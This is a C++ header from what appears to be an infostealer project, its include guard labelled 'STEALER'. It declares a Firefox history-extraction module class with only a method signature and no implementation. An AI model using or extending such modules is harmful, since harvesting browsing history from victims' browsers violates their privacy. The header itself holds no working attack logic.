//
// Created by .1qxz on 10.06.2024.
//

#ifndef STEALER_FHISTORY_H
#define STEALER_FHISTORY_H


#include "../FirefoxBrowserModule.h"
#include "../../../../../utils/SQLiteUtil.h"

class FHistory : public FirefoxBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
};


#endif //STEALER_FHISTORY_H
